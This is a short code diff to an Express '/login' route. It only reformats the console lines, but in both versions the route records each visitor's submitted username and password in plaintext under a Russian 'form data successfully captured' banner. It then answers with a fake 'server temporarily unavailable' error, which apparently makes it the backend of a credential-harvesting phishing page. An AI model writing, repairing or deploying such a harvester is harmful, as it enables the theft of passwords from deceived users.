@@ -174,11 +174,11 @@ app.post('/login', (req, res) => {
     const userLogin = req.body.username;
     const userPassword = req.body.password;
     
-    console.log(\`\\n========================================\`);
-    console.log(\`[БЭКЕНД] ДАННЫЕ ФОРМЫ УСПЕШНО ЗАФИКСИРОВАНЫ:\`);
-    console.log(\`ВВЕДЕННЫЙ ЛОГИН: \${userLogin}\`);
-    console.log(\`ВВЕДЕННЫЙ ПАРОЛЬ: \${userPassword}\`);
-    console.log(\`========================================\`);
+    console.log('\n========================================');
+    console.log('[БЭКЕНД] ДАННЫЕ ФОРМЫ УСПЕШНО ЗАФИКСИРОВАНЫ:');
+    console.log('ВВЕДЕННЫЙ ЛОГИН: ' + userLogin);
+    console.log('ВВЕДЕННЫЙ ПАРОЛЬ: ' + userPassword);
+    console.log('========================================');
     
     res.status(503).send('Сервер временно недоступен. Пожалуйста, попробуйте войти позже.');
 });
